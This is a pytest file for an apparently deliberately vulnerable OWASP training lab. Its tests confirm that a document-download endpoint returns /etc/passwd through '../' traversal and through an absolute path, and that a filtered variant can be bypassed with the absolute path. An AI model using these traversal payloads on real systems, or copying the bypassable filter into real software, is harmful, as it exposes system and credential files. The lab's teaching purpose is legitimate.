def test_download_document_returns_legitimate_content(client):
    response = client.get("/a01/download-document?name=welcome.txt")
    assert response.status_code == 200
    assert b"Welcome to the OWASP Lab document center" in response.data


def test_download_document_reads_arbitrary_file_via_relative_traversal(client):
    response = client.get("/a01/download-document?name=" + "../" * 20 + "etc/passwd")
    assert response.status_code == 200
    assert b"root:" in response.data


def test_download_document_reads_arbitrary_file_via_absolute_path(client):
    response = client.get("/a01/download-document", query_string={"name": "/etc/passwd"})
    assert response.status_code == 200
    assert b"root:" in response.data


def test_download_document_filtered_blocks_relative_traversal(client):
    response = client.get(
        "/a01/download-document-filtered?name=" + "../" * 20 + "etc/passwd"
    )
    assert response.status_code == 200
    assert b"Blocked" in response.data
    assert b"root:" not in response.data


def test_download_document_filtered_bypassed_via_absolute_path(client):
    response = client.get(
        "/a01/download-document-filtered", query_string={"name": "/etc/passwd"}
    )
    assert response.status_code == 200
    assert b"root:" in response.data
